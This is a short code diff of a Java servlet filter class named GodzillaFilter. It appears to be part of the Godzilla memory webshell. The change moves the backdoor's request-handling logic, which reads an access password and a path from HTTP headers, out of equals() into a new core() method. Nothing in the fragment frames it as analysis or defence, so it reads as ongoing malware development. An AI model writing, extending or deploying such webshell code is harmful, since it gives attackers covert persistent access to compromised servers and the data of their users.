@@ -114,8 +114,7 @@ public class GodzillaFilter extends ClassLoader implements Filter {
         return value;
     }
 
-    public boolean equals(Object obj) {
-        this.parseObj(obj);
+    public void core() {
         this.Pwd = this.request.getHeader("p");
         this.md5 = md5(this.Pwd + this.xc);
         this.path = this.request.getHeader("path");
@@ -138,7 +137,11 @@ public class GodzillaFilter extends ClassLoader implements Filter {
             this.response.getWriter().close();
         } catch (Exception var6) {
         }
+    }
 
+    public boolean equals(Object obj) {
+        this.parseObj(obj);
+        core();
         return true;
     }
 
